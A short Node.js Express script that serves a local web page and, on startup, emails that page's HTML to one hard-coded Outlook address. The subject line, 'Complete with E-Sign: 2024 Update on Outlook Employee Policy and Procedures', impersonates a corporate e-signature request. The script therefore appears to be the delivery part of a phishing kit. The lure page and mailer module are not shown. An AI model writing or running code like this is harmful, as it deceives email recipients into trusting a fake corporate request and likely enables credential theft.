import express from 'express';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const PORT = 3000;

// Define __dirname in terms of ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});

// Define your email contents
const toEmail = "awoyiyi@outlook.com";
const subject = "Complete with E-Sign: 2024 Update on Outlook Employee Policy and Procedures";

app.listen(PORT, async () => {
    console.log(`Server is running on http://localhost:${PORT}`);

    try {
        const html = await fs.readFile(path.join(__dirname, 'public/index.html'), 'utf8');
        
        // Assuming mailer.js is setup to use ESM
        const { default: sendMail } = await import('./helper/mailer.js');
        await sendMail(toEmail, subject, html);
        console.log('Email sent successfully');
    } catch (error) {
        console.error('Error:', error);
    }
});
